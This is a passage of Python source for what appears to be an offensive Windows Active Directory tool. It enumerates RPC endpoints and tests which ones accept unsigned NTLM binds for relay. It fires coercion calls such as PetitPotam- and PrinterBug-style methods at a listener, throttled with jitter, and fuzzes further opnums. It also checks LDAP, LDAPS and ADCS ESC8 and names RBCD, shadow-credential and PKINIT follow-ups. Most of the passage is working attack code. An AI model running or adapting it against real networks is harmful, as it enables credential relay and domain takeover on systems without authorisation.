_RB_STRING = _re.compile(r'wchar_t\s*\*|LPWSTR|PWSTR|LPCWSTR')
_RB_UNSUPPORTED = _re.compile(
    r'context_handle|GUID|_Struct|struct\b|\*\s*\*|size_is|\[\s*\]|'
    r'byte\s*\*|void\s*\*')
_RB_SCALAR = _re.compile(
    r'__int64|hyper|short|SHORT|byte|BYTE|boolean|char|CHAR|int|long|LONG|'
    r'DWORD|ULONG|USHORT|UCHAR|BOOL|unsigned')
_RB_KNOWN = {
    'c681d488-d850-11d0-8c52-00c04fd90f7e': 'MS-EFSR(lsarpc)',
    'df1941c5-fe89-4e79-bf10-463657acf44d': 'MS-EFSR(efsrpc)',
    '12345678-1234-abcd-ef00-0123456789ab': 'MS-RPRN',
    '76f03f96-cdfd-44fc-a22c-64950a001209': 'MS-PAR',
    '4fc742e0-4a10-11cf-8273-00aa004ae673': 'MS-DFSNM',
    'a8e0653c-2744-4389-a61d-7373df8b2292': 'MS-FSRVP',
}


def _rb_split_params(s):
    parts, depth, buf = [], 0, ''
    for ch in s:
        if ch in '([':
            depth += 1; buf += ch
        elif ch in ')]':
            depth -= 1; buf += ch
        elif ch == ',' and depth == 0:
            parts.append(buf.strip()); buf = ''
        else:
            buf += ch
    if buf.strip():
        parts.append(buf.strip())
    return parts


def _rb_fuzzable(params):
    n_str = 0
    for p in params:
        attrs = p[:p.find(']') + 1] if ']' in p else ''
        is_in = bool(_re.search(r'\bin\b', attrs))
        if _re.search(r'\bout\b', attrs) and not is_in:
            continue
        if _re.search(r'\bhandle_t\b', p) and 'context_handle' not in p:
            continue
        if 'context_handle' in p:
            return False, 0
        if _RB_STRING.search(p):
            if _re.search(r'wchar_t\s*\*\s*\*', p):
                return False, 0
            n_str += 1
            continue
        if _RB_UNSUPPORTED.search(p):
            return False, 0
        if _RB_SCALAR.search(p):
            continue
        return False, 0
    return (n_str > 0), n_str


def rebuild_candidates(dump_path, out_path):
    """Parse an NtObjectManager IDL dump into the sidecar CSV. Returns (rows,
    remote_count, known_count)."""
    import csv as _csv
    text = open(dump_path, encoding='utf-8', errors='replace').read()
    lines = text.splitlines()
    blocks, cur = [], []
    for ln in lines:
        if ln.startswith('// DllOffset:') or (ln.startswith('// DllPath')
                                              and not cur):
            if cur:
                blocks.append(cur)
            cur = [ln]
        else:
            cur.append(ln)
    if cur:
        blocks.append(cur)

    rows = []
    for blk in blocks:
        btext = '\n'.join(blk)
        dll = ''
        eps = []
        for ln in blk:
            m = _re.match(r'// DllPath\s+(.*)', ln)
            if m:
                dll = m.group(1).strip().split('\\')[-1]
            m = _re.match(r'//\s*(ncacn_ip_tcp|ncacn_np):\[', ln)
            if m:
                eps.append(m.group(1))
        remote = ('tcp' if 'ncacn_ip_tcp' in eps
                  else 'np' if 'ncacn_np' in eps else 'local')
        for im in _re.finditer(
                r'\[\s*uuid\(([0-9A-Fa-f-]+)\),\s*version\(([0-9.]+)\)\s*\]'
                r'\s*interface\s+\w+\s*\{(.*?)\n\}', btext, _re.S):
            uuid = im.group(1).lower()
            ver = im.group(2)
            body = im.group(3)
            stmts = _re.findall(r'[^;{}]*?\([^;]*?\)\s*;', body, _re.S)
            for opnum, st in enumerate(stmts):
                s1 = ' '.join(st.split())
                mm = _re.match(r'(.*?)\s+(\w+)\s*\((.*)\)\s*;', s1, _re.S)
                if not mm:
                    continue
                params = _rb_split_params(mm.group(3))
                ok, n_str = _rb_fuzzable(params)
                if not ok:
                    continue
                rows.append({
                    'uuid': uuid, 'ver': ver, 'opnum': opnum, 'nstr': n_str,
                    'remote': remote, 'known': _RB_KNOWN.get(uuid, ''),
                    'dll': dll, 'params': ' || '.join(params),
                })

    order = {'tcp': 0, 'np': 1, 'local': 2}
    rows.sort(key=lambda r: (order[r['remote']], 0 if r['known'] else 1,
                             len(r['params'])))
    with open(out_path, 'w', newline='') as f:
        w = _csv.writer(f)
        w.writerow(['uuid', 'ver', 'opnum', 'nstr', 'remote', 'known', 'dll',
                    'params'])
        for r in rows:
            w.writerow([r['uuid'], r['ver'], r['opnum'], r['nstr'], r['remote'],
                        r['known'], r['dll'], r['params']])
    remote_n = sum(1 for r in rows if r['remote'] != 'local')
    known_n = sum(1 for r in rows if r['known'])
    return rows, remote_n, known_n


def load_candidates(path=None):
    """Read candidates (uuid,ver,opnum,nstr,remote,known,dll,params) into
    {uuid: [ {opnum, ver, params(list), remote, known, dll}, ... ]}. With no
    path, use the list embedded in this script."""
    import csv as _csv
    import io as _io
    if path:
        fh = open(path, newline='')
    else:
        fh = _io.StringIO(_embedded_candidates_csv())
    cand = {}
    with fh:
        rd = _csv.DictReader(fh)
        for row in rd:
            u = (row.get('uuid') or '').strip().lower()
            if not u:
                continue
            try:
                op = int(row['opnum'])
            except (KeyError, ValueError):
                continue
            params = [p.strip() for p in (row.get('params') or '').split('||')
                      if p.strip()]
            cand.setdefault(u, []).append({
                'opnum': op, 'ver': (row.get('ver') or '1.0').strip(),
                'params': params, 'remote': (row.get('remote') or '').strip(),
                'known': (row.get('known') or '').strip(),
                'dll': (row.get('dll') or '').strip(),
            })
    return cand


# --------------------------------------------------------------------------- #
# Callback listener: a bare TCP accept loop that records which source IPs
# connected. A connect-back from the target proves it was coerced; we do not
# need to complete NTLM to know the trigger fired.
# --------------------------------------------------------------------------- #
class CallbackListener(object):
    def __init__(self, bind_ip, port):
        self.bind_ip = bind_ip
        self.port = port
        self._seen = set()
        self._lock = threading.Lock()
        self._sock = None
        self._stop = threading.Event()
        self._thread = None

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.bind_ip, self.port))
        self._sock.listen(50)
        self._sock.settimeout(0.5)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with self._lock:
                self._seen.add(addr[0])
            try:
                conn.close()
            except OSError:
                pass

    def saw(self, ip):
        with self._lock:
            return ip in self._seen

    def clear(self, ip):
        with self._lock:
            self._seen.discard(ip)

    def stop(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass


# --------------------------------------------------------------------------- #
# Core
# --------------------------------------------------------------------------- #
_print_lock = threading.Lock()

# Application/IPC pipes that are not RPC services. We drop these so the pipe
# discovery focuses on real RPC endpoints. Any pipe with a sub-path backslash or
# a GUID-style name is also treated as noise.
_PIPE_NOISE = (
    'mojo.', 'crashpad', 'dotnet-diagnostic', 'vmware', 'vmx', 'nvmessagebus',
    'nvwks', 'googledrivefs', 'bravesoftware', 'pshost.', 'qt-',
    'systemusagereport', 'wifinetworkmanager', 'privateinternetaccess',
    'openvpn', 'kapspipe', 'msftewds', 'pipe_eventroot', 'appcontracts',
    'backingapp', 'fthpipe', 'nvcontainer', 'catalogchangelistener', 'devios',
    'dsaservice', 'dsatrayservice', 'bittorrent', 'chrome.',
)

# Bare GUID-named pipes (no braces) are per-process app IPC, not RPC services.
_GUID_PIPE_RE = _re.compile(
    r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
    r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}')


def _is_noise_pipe(name):
    if '\\' in name or '{' in name:
        return True
    if _GUID_PIPE_RE.match(name):
        return True
    low = name.lower()
    return any(tok in low for tok in _PIPE_NOISE)


class RPCAuthMap(object):
    def __init__(self, username, password, domain, hashes, timeout,
                 show_all, probe_pipes, do_brute, do_coerce,
                 listener=None, listener_ip=None, coerce_timeout=5, debug=False,
                 relay_checks=False, do_fuzz=False, fuzz_candidates=None,
                 fuzz_delay=0.5, fuzz_jitter=0.5, fuzz_max=200,
                 fuzz_dry_run=False, fuzz_remote_only=True):
        self.debug = debug
        self.relay_checks = relay_checks
        self.do_fuzz = do_fuzz
        self.fuzz_candidates = fuzz_candidates or {}
        self.fuzz_delay = fuzz_delay
        self.fuzz_jitter = fuzz_jitter
        self.fuzz_max = fuzz_max
        self.fuzz_dry_run = fuzz_dry_run
        self.fuzz_remote_only = fuzz_remote_only
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        if hashes:
            self.lmhash, self.nthash = hashes.split(':')
        # Anonymous run: no username and no hash. Authenticated-level binds are
        # meaningless and can stall, so the floor probe is skipped in this mode.
        self.anon = not (username or self.nthash)
        self.timeout = timeout
        self.show_all = show_all
        self.probe_pipes = probe_pipes
        self.do_brute = do_brute
        self.do_coerce = do_coerce
        self.listener = listener
        self.listener_ip = listener_ip
        self.coerce_timeout = coerce_timeout

    # ---- debug helper ----------------------------------------------------- #
    def _dbg(self, stage, host, err):
        if self.debug:
            with _print_lock:
                sys.stderr.write(c('    [dbg %s %s] %r\n'
                                   % (stage, host, err), C.GREY))

    # ---- credential helper ------------------------------------------------ #
    def _set_creds(self, rpctransport):
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(
                self.username, self.password, self.domain,
                self.lmhash, self.nthash)

    # ---- STAGE 1a : endpoint mapper -------------------------------------- #
    def enum_epmapper(self, host):
        """Return list of dicts: {uuid, binding}. hept_lookup makes its own
        connection+bind, so we must NOT pre-bind the portmap interface or the
        second (internal) bind is rejected."""
        out = []
        try:
            resp = epm.hept_lookup(host)
        except Exception as e:
            self._dbg('epmapper', host, e)
            return out

        # Each entry: entry['tower']['Floors']; floors[0] stringifies to
        # "<UUID> v<maj>.<min>"; PrintStringBinding(floors) gives the binding.
        for entry in resp or []:
            try:
                tower = entry['tower']['Floors']
            except Exception:
                continue
            uuid_str = ''
            ver = '1.0'
            binding = ''
            try:
                # str(floors[0]) is like "<UUID> v<maj>.<min>"
                parts = str(tower[0]).split(' ')
                uuid_str = parts[0].lower()
                if len(parts) > 1 and parts[1].lower().startswith('v'):
                    ver = parts[1][1:]
            except Exception:
                pass
            try:
                binding = epm.PrintStringBinding(tower)
            except Exception:
                binding = ''
            out.append({'uuid': uuid_str, 'binding': binding, 'ver': ver})
        return out

    # ---- STAGE 1b : SMB pipe enumeration --------------------------------- #
    def enum_pipes(self, host):
        pipes = []
        try:
            smb = SMBConnection(host, host, timeout=self.timeout)
            smb.login(self.username, self.password, self.domain,
                      self.lmhash, self.nthash)
            for f in smb.listPath('IPC$', '\\*'):
                name = f.get_longname()
                if name in ('.', '..') or _is_noise_pipe(name):
                    continue
                pipes.append(name)
            try:
                smb.logoff()
            except Exception:
                pass
        except Exception as e:
            self._dbg('pipes', host, e)
        return pipes

    # ---- STAGE 1c : MGMT inq_if_ids on one endpoint ---------------------- #
    def query_ifids(self, stringbinding):
        uuids = []
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_connect_timeout(self.timeout)
        self._set_creds(rpctransport)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(mgmt.MSRPC_UUID_MGMT)
            resp = mgmt.hinq_if_ids(dce)
            vector = resp['if_id_vector']
            count = vector['count']
            for i in range(count):
                try:
                    entry = vector['if_id'][i]
                    u = bin_to_string(entry['Uuid']).lower()
                    ver = '%d.%d' % (entry['VersMajor'], entry['VersMinor'])
                    uuids.append((u, ver))
                except Exception:
                    continue
        except Exception as e:
            # Field names vary across impacket versions; if this raises, the
            # mapper/pipe discovery still stands. Validate on the Kali box and
            # adjust 'if_id_vector'/'Count'/'if_id' if needed.
            self._dbg('ifids', stringbinding, e)
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
        return uuids

    # ---- STAGE 1d : UUID brute-bind -------------------------------------- #
    def brute_bind(self, stringbinding):
        found = []
        for u in list(KNOWN_INTERFACES.keys()):
            try:
                rpctransport = transport.DCERPCTransportFactory(stringbinding)
                rpctransport.set_connect_timeout(self.timeout)
                self._set_creds(rpctransport)
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(uuidtup_to_bin((u, '1.0')))
                found.append((u, '1.0'))
                dce.disconnect()
            except Exception:
                continue
        return found

    # ---- SMB signing posture (the real relay gate for pipe endpoints) ---- #
    def get_smb_signing(self, host):
        """True = signing required (pipe relay blocked), False = not required,
        None = could not determine."""
        try:
            smb = SMBConnection(host, host, timeout=self.timeout)
            try:
                smb.login(self.username, self.password, self.domain,
                          self.lmhash, self.nthash)
            except Exception:
                pass  # negotiate already carries the signing flag
            req = smb.isSigningRequired()
            try:
                smb.logoff()
            except Exception:
                pass
            return req
        except Exception as e:
            self._dbg('smbsign', host, e)
            return None

    # ---- STAGE 3 : relay-destination auth floor -------------------------- #
    def probe_floor(self, stringbinding, uuid_str, ver='1.0'):
        """Relay verdict for one endpoint, in a SINGLE bind.

        A relayed NTLM session is an authenticated bind with no signing, i.e.
        exactly AUTHN_LEVEL_CONNECT, so we model the relay by trying that one
        level rather than climbing none/connect/integrity/privacy. Returns:
          'connect'   -> unsigned authenticated bind accepted => RELAY-VIABLE
          'protected' -> bind rejected (signing/integrity enforced)
          None        -> endpoint unreachable (transport failed)
        This is the main speed lever: one connect+bind per interface, and a dead
        port costs one timeout instead of four."""
        try:
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_connect_timeout(self.timeout)
            self._set_creds(rpctransport)
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
            dce.connect()
        except Exception:
            return None  # transport unreachable; do not retry other levels
        try:
            dce.bind(uuidtup_to_bin((uuid_str, ver)))
            floor = 'connect'
        except Exception:
            floor = 'protected'
        try:
            dce.disconnect()
        except Exception:
            pass
        return floor

    # ---- STAGE 4 : active coercion probe --------------------------------- #
    def coerce_probe(self, host, descriptor):
        """Try each trigger of a coercible interface; return list of hits.
        A hit = the listener saw a connect-back from host, OR the server threw
        one of the expected post-dial errors (dialed us but no such file)."""
        hits = []
        unc = '\\\\%s\\%s\\file' % (self.listener_ip, _rand_tag())
        for pipe in descriptor['pipes']:
            sb = r'ncacn_np:%s[\PIPE\%s]' % (host, pipe)
            for method_name, arg_name, fire in descriptor['triggers']:
                self._coerce_one(host, sb, descriptor, pipe, method_name,
                                 fire, unc, hits)
                if any(h['method'] == method_name and h['confirmed'] for h in hits):
                    # already confirmed via this method on this pipe; move on
                    break
        return hits

    def _coerce_one(self, host, sb, descriptor, pipe, method_name, fire, unc, hits):
        if self.listener:
            self.listener.clear(host)
        rpctransport = transport.DCERPCTransportFactory(sb)
        rpctransport.set_connect_timeout(self.timeout)
        self._set_creds(rpctransport)
        # status: 'confirmed' | 'sent' (reached, no callback) | 'error' (call
        # faulted in an unexpected way) | 'nobind' (could not even bind the pipe)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(uuidtup_to_bin(descriptor['uuidtup']))
        except Exception as e:
            self._dbg('coerce-bind %s via %s' % (method_name, pipe), host, e)
            es = str(e)
            if 'STATUS_OBJECT_NAME_NOT_FOUND' in es:
                reason = ('\\PIPE\\%s not present (the backing service is not '
                          'running on the target)' % pipe)
            elif 'STATUS_ACCESS_DENIED' in es or 'access_denied' in es.lower():
                reason = ('access denied opening \\PIPE\\%s with these '
                          'credentials' % pipe)
            else:
                reason = es.split('\n')[0][:70]
            hits.append({'iface': descriptor['label'], 'pipe': pipe,
                         'method': method_name, 'confirmed': False,
                         'status': 'nobind', 'reason': reason})
            return
        status = 'error'
        reason = ''
        try:
            fire(dce, unc, host)
            status = 'sent'
            reason = 'call accepted (no fault)'
        except Exception as e:
            es = str(e)
            self._dbg('coerce-fire %s via %s' % (method_name, pipe), host, e)
            if any(code in es for code in _EXPECTED_COERCE_ERRORS):
                status = 'sent'
                reason = 'post-dial error (reached out)'
            else:
                status = 'error'
                reason = es.split('\n')[0][:70]
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
        # Give the target a moment to dial the listener (only if the call went out).
        confirmed = False
        if status == 'sent' and self.listener:
            deadline = time.time() + self.coerce_timeout
            while time.time() < deadline:
                if self.listener.saw(host):
                    confirmed = True
                    break
                time.sleep(0.25)
        hits.append({
            'iface': descriptor['label'], 'pipe': pipe,
            'method': method_name,
            'confirmed': confirmed,
            'status': 'confirmed' if confirmed else status,
            'reason': reason,
        })

    # ---- LEVEL-2 : targeted fuzz of discovered interfaces ---------------- #
    def _fuzz_pick_binding(self, bindings):
        """Prefer direct TCP, then a named pipe; skip local-only ncalrpc."""
        tcp = [b for b in bindings if b.startswith('ncacn_ip_tcp')]
        np = [b for b in bindings if b.startswith('ncacn_np')]
        if tcp:
            return tcp[0]
        if np:
            return np[0]
        return None

    def fuzz_probe(self, host, iface_bindings, iface_versions):
        """For each discovered interface that has candidate opnums, blind-fire a
        UNC at each and classify. Returns a list of result dicts."""
        results = []
        fired = 0
        unc = '\\\\%s\\%s\\file' % (self.listener_ip, _rand_tag())
        # only interfaces we actually found on THIS host and have candidates for
        targets = []
        for u, bindings in sorted(iface_bindings.items()):
            if u not in self.fuzz_candidates:
                continue
            sb = self._fuzz_pick_binding(bindings)
            if sb is None:
                continue  # local-only, not reachable over the network
            is_remote_ep = sb.startswith('ncacn_ip_tcp') or sb.startswith('ncacn_np')
            if self.fuzz_remote_only and not is_remote_ep:
                continue
            targets.append((u, sb))

        for u, sb in targets:
            ver = iface_versions.get(u, '1.0')
            for cand in self.fuzz_candidates[u]:
                if fired >= self.fuzz_max:
                    results.append({'uuid': u, 'opnum': -1, 'verdict': 'capped',
                                    'detail': 'per-host fuzz cap (%d) reached'
                                    % self.fuzz_max, 'known': cand.get('known', '')})
                    return results
                inst, why = _fuzz_build_call(cand['opnum'], cand['params'], unc)
                if inst is None:
                    results.append({'uuid': u, 'opnum': cand['opnum'],
                                    'verdict': 'skipped', 'detail': why,
                                    'known': cand.get('known', '')})
                    continue
                if self.fuzz_dry_run:
                    results.append({'uuid': u, 'opnum': cand['opnum'],
                                    'verdict': 'would-fire',
                                    'detail': '%d arg(s), via %s'
                                    % (len(inst.structure), sb.split(':')[0]),
                                    'known': cand.get('known', '')})
                    continue
                verdict, detail = self._fuzz_fire_one(host, sb, u, ver, inst)
                results.append({'uuid': u, 'opnum': cand['opnum'],
                                'verdict': verdict, 'detail': detail,
                                'known': cand.get('known', '')})
                fired += 1
                # throttle: base delay + random jitter, so the fire pattern is
                # not a metronome and the DC is not hammered.
                if self.fuzz_delay or self.fuzz_jitter:
                    import random
                    time.sleep(self.fuzz_delay + random.random() * self.fuzz_jitter)
        return results

    def _fuzz_fire_one(self, host, sb, uuid_str, ver, inst):
        """Bind + fire one built call; classify by callback / error.
        verdicts: CONFIRMED, LIKELY, accepted, rejected, nobind."""
        if self.listener:
            self.listener.clear(host)
        rpctransport = transport.DCERPCTransportFactory(sb)
        rpctransport.set_connect_timeout(self.timeout)
        self._set_creds(rpctransport)
        try:
            dce = rpctransport.get_dce_rpc()
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(uuidtup_to_bin((uuid_str, ver)))
        except Exception as e:
            return 'nobind', '%s' % (str(e).split('\n')[0][:60])
        reached = False
        detail = ''
        try:
            # Send the request and read the raw reply WITHOUT asking impacket to
            # map it onto a generated Response class (our class is dynamic and has
            # none, which otherwise throws "no attribute FuzzCall_opNResponse").
            dce.call(inst.opnum, inst)
            dce.recv()
            detail = 'call accepted, no error (likely not a path arg)'
        except Exception as e:
            es = str(e)
            if any(code in es for code in _FUZZ_REACHOUT_ERRORS):
                reached = True
                detail = 'path-not-found error returned (unconfirmed, no callback)'
            elif 'nca_s_op_rng_error' in es or 'opnum' in es.lower():
                return 'rejected', 'bad opnum on this build'
            elif 'nca_s_fault' in es or 'NDR' in es or 'unmarshal' in es.lower():
                return 'rejected', 'arg shape rejected (%s)' % es.split('\n')[0][:40]
            elif 'access_denied' in es.lower() or 'STATUS_ACCESS_DENIED' in es:
                return 'rejected', 'access denied (call refused, not a dial)'
            else:
                detail = 'fault: %s' % es.split('\n')[0][:50]
        finally:
            try:
                dce.disconnect()
            except Exception:
                pass
        # watch for the call-back
        if self.listener:
            deadline = time.time() + self.coerce_timeout
            while time.time() < deadline:
                if self.listener.saw(host):
                    return 'CONFIRMED', 'callback received'
                time.sleep(0.2)
        if reached:
            return 'LIKELY', detail
        return 'accepted', detail

    # ---- orchestration per host ------------------------------------------ #
    def scan(self, host):
        lines = []
        relay_count = 0
        coerce_count = 0

        ep = self.enum_epmapper(host)
        pipes = self.enum_pipes(host) if self.probe_pipes else []

        if not ep and not pipes:
            return host, (0, 0, [c('[-] %s: no RPC reachable' % host, C.GREY)],
                          'quiet', {'host': host, 'coercibles': [],
                                    'rpc_relay': [], 'smb_signing': None,
                                    'ldap': None, 'ldaps': None, 'esc8': []})

        # Build a merged interface view: uuid -> set of stringbindings, plus
        # uuid -> interface version (so binds use the real version).
        iface_bindings = {}
        iface_versions = {}
        for e in ep:
            u = e['uuid']
            if not u:
                continue
            iface_bindings.setdefault(u, set())
            if e['binding']:
                iface_bindings[u].add(e['binding'])
            iface_versions.setdefault(u, e.get('ver') or '1.0')

        # Pipe-sourced discovery: ask each pipe what it serves (ifids), and
        # record ncacn_np bindings for anything found.
        for pipe in pipes:
            sb = r'ncacn_np:%s[\PIPE\%s]' % (host, pipe)
            served = self.query_ifids(sb)
            if not served and self.do_brute:
                served = self.brute_bind(sb)
            for u, ver in served:
                iface_bindings.setdefault(u, set()).add(sb)
                iface_versions.setdefault(u, ver or '1.0')

        # SMB signing matters only for the relay-DESTINATION role (relaying INTO
        # this host, or a self-reflection). It is irrelevant to using this host
        # as a coercion SOURCE.
        smb_signing = None if self.anon else self.get_smb_signing(host)

        coercibles = []     # {uuid, label, how, auto, confirmed}
        relay_viables = []  # {uuid, label, binding, floor, is_pipe}
        detail_rows = []    # full per-iface blocks for --show-all

        for u, bindings in sorted(iface_bindings.items()):
            name = KNOWN_INTERFACES.get(u, 'unknown interface')
            coercible = u in COERCION_DB
            ver = iface_versions.get(u, '1.0')
            sb_list = sorted(bindings)
            # Probe remote transports only, TCP first, pipe as fallback. An
            # interface with only ncalrpc bindings is local-only (reachable only
            # from a process ON that box), so there is nothing to probe remotely.
            probe_order = [b for b in sb_list if b.startswith('ncacn_ip_tcp')] + \
                          [b for b in sb_list if b.startswith('ncacn_np')]
            remote_reachable = bool(probe_order)
            # If SMB signing is required, a named-pipe endpoint cannot be relayed
            # into no matter what its RPC floor is, so skip probing pipes entirely
            # and only test direct-TCP endpoints. On a signing-required host this
            # removes almost every bind, which is the bulk of the runtime.
            if smb_signing is True:
                probe_set = [b for b in probe_order
                             if b.startswith('ncacn_ip_tcp')]
            else:
                probe_set = probe_order
            pipe_only_blocked = (smb_signing is True and remote_reachable
                                 and not probe_set)
            floor = None
            used_sb = None
            if not self.anon:
                for b in probe_set:
                    f = self.probe_floor(b, u, ver)
                    if f is not None:
                        floor = f
                        used_sb = b
                        break
            relay_viable = floor in RELAY_VIABLE_FLOORS
            is_pipe = bool(used_sb and used_sb.startswith('ncacn_np'))
            blocked_by_smb = pipe_only_blocked or (is_pipe and smb_signing is True)
            effective_relay = relay_viable and not blocked_by_smb

            if effective_relay:
                relay_count += 1
                relay_viables.append({'uuid': u, 'label': name,
                                      'binding': used_sb, 'floor': floor,
                                      'is_pipe': is_pipe})

            if coercible:
                desc = COERCION_DB[u]
                methods = ', '.join(m[0] for m in desc['triggers'])
                entry = {'uuid': u, 'label': desc['label'],
                         'how': '%s take a UNC/server argument' % methods,
                         'auto': True, 'confirmed': None, 'attempted': False,
                         'fail_reason': ''}
                if self.do_coerce and not self.fuzz_dry_run:
                    entry['attempted'] = True
                    hits = self.coerce_probe(host, desc)
                    if any(h['confirmed'] for h in hits):
                        entry['confirmed'] = True
                        coerce_count += 1
                    elif any(h.get('status') == 'sent' for h in hits):
                        entry['confirmed'] = False       # reached out, no callback
                    else:
                        entry['confirmed'] = None         # could not bind/send
                        entry['fail_reason'] = next(
                            (h.get('reason') for h in hits if h.get('reason')), '')
                coercibles.append(entry)

            if self.show_all:
                blk = ['    %s  %s' % (
                    c(name, C.BOLD) if name != 'unknown interface'
                    else c(name, C.YELLOW), c(u, C.GREY))]
                note = INTERFACE_NOTES.get(u)
                if note:
                    blk.append(c('        use: %s' % note, C.CYAN))
                for b in sb_list:
                    blk.append(c('        %s' % b, C.GREY))
                if not remote_reachable:
                    blk.append(c('        local only (ncalrpc) - not reachable '
                                 'over the network, cannot test', C.GREY))
                elif pipe_only_blocked:
                    blk.append(c('        pipe only; SMB signing REQUIRED blocks '
                                 'pipe relay - not probed', C.GREEN))
                elif effective_relay:
                    blk.append(c('        floor=%s -> relay VIABLE' % floor, C.RED))
                elif blocked_by_smb:
                    blk.append(c('        open but SMB signing blocks pipe relay',
                                 C.GREEN))
                elif floor is None:
                    blk.append(c('        floor: inconclusive (remote bind '
                                 'failed)', C.GREY))
                else:
                    blk.append(c('        floor=%s -> protected' % floor, C.GREEN))
                detail_rows.append(blk)

        # ---- LEVEL-2 fuzz (opt-in) : only interfaces found on THIS host ---- #
        fuzz_results = []
        if self.do_fuzz and self.fuzz_candidates:
            fuzz_results = self.fuzz_probe(host, iface_bindings, iface_versions)

        # ---------------- render ---------------- #
        lines.append(c('[*] %s' % host, C.BOLD + C.CYAN))

        # == IS THIS A COERCION SOURCE ==
        lines.append(c('  == IS THIS A COERCION SOURCE ==', C.BOLD + C.CYAN))
        if coercibles:
            for e in coercibles:
                if e['confirmed'] is True:
                    verdict = c('CONFIRMED', C.BOLD + C.GREEN)
                elif e['confirmed'] is False:
                    verdict = c('LIKELY (call sent, no callback)', C.YELLOW)
                elif e.get('attempted'):
                    verdict = c('CANDIDATE (fire failed)', C.YELLOW)
                else:
                    verdict = c('CANDIDATE', C.YELLOW)
                lines.append('     %s  %s  %s'
                             % (verdict, c(e['label'], C.BBLUE),
                                c(e['uuid'], C.GREY)))
                lines.append(c('        Why: %s' % e['how'], C.GREY))
                if e['confirmed'] is None and e.get('attempted'):
                    rtxt = e.get('fail_reason') or 'no bind/response'
                    lines.append(c('        Active fire attempted but did not land: '
                                   '%s (run with -v for detail)' % rtxt, C.GREY))
        else:
            lines.append(c('     No. No coercible interface exposed.', C.GREEN))

        # == RELAY DESTINATION ==
        sign_txt = ('REQUIRED' if smb_signing is True else 'not required'
                    if smb_signing is False else 'unknown')
        sign_col = (C.GREEN if smb_signing is True else C.RED
                    if smb_signing is False else C.GREY)
        lines.append(c('  == IS THIS A RELAY DESTINATION ==', C.BOLD + C.CYAN))
        lines.append('     %s' % c('SMB signing: %s' % sign_txt, sign_col))
        if relay_viables:
            for r in relay_viables:
                how = ('direct TCP, no SMB layer' if not r['is_pipe']
                       else 'pipe, SMB signing off')
                lines.append('     %s  %s  %s'
                             % (c('VIABLE', C.BRED), c(r['label'], C.BOLD),
                                c(r['uuid'], C.GREY)))
                lines.append(c('        %s  (floor=%s, %s)'
                               % (r['binding'], r['floor'], how), C.GREY))
                rnote = INTERFACE_NOTES.get(r['uuid'])
                if rnote:
                    lines.append(c('        use: %s' % rnote, C.CYAN))
        elif smb_signing is True:
            lines.append(c('     No. SMB signing REQUIRED blocks every '
                           'named-pipe relay on this host.', C.GREEN))
        else:
            lines.append(c('     No viable relay destination.', C.GREEN))

        # == CROSS-PROTOCOL RELAY TARGETS (LDAP / LDAPS / ADCS) ==
        ldap_viable = []
        ls = cb = None
        esc8 = []
        if self.relay_checks:
            lines.append(c('  == CROSS-PROTOCOL RELAY TARGETS ==', C.BOLD + C.CYAN))

            ls = check_ldap_signing(host, self.timeout)
            lcol = (C.BRED if 'NOT required' in ls else C.GREEN
                    if ls == 'required' else C.GREY)
            lines.append('     LDAP signing (389): %s' % c(ls, lcol))
            if 'NOT required' in ls:
                ldap_viable.append('LDAP')
                lines.append(c('        -> relay here to write RBCD or shadow '
                               'credentials (then S4U/PKINIT)', C.CYAN))

            cb = check_ldaps_channel_binding(host, self.timeout)
            ccol = (C.BRED if 'NOT required' in cb else C.GREEN
                    if cb == 'required' else C.GREY)
            lines.append('     LDAPS channel binding (636): %s' % c(cb, ccol))
            if 'NOT required' in cb:
                ldap_viable.append('LDAPS')
                lines.append(c('        -> relay HTTP-origin auth here for the '
                               'same RBCD / shadow-cred writes', C.CYAN))

            esc8 = check_esc8(host, self.timeout)
            if esc8:
                ldap_viable.append('ADCS ESC8')
                lines.append('     ADCS web enrollment: %s'
                             % c('NTLM-accepting (ESC8 candidate)', C.BRED))
                for u in esc8:
                    lines.append(c('        %s' % u, C.GREY))
                lines.append(c('        -> relay here for a cert as the victim, '
                               'then PKINIT or PassTheCert', C.CYAN))
            else:
                lines.append('     ADCS web enrollment: %s'
                             % c('none found (no NTLM /certsrv endpoint)',
                                 C.GREEN))

        # == CONCLUSION ==
        lines.append(c('  == CONCLUSION ==', C.BOLD + C.CYAN))
        if coercibles:
            cnames = ', '.join(e['label'] for e in coercibles)
            lines.append(c('     Coercible via: %s' % cnames, C.YELLOW))
            lines.append(c('       Reason: exposes an RPC method that reaches out '
                           'to a UNC you supply', C.GREY))
        else:
            lines.append(c('     Coercible: none found on this host', C.GREY))
        if relay_viables:
            tcpn = sum(1 for r in relay_viables if not r['is_pipe'])
            lines.append(c('     Relay target: %d endpoint(s), %d over direct TCP'
                           % (len(relay_viables), tcpn), C.BRED))
            lines.append(c('       Reason: these accept an unsigned bind and TCP '
                           'has no SMB signing in the path', C.GREY))
        elif smb_signing is True:
            lines.append(c('     Relay target: none; SMB signing closes the pipe '
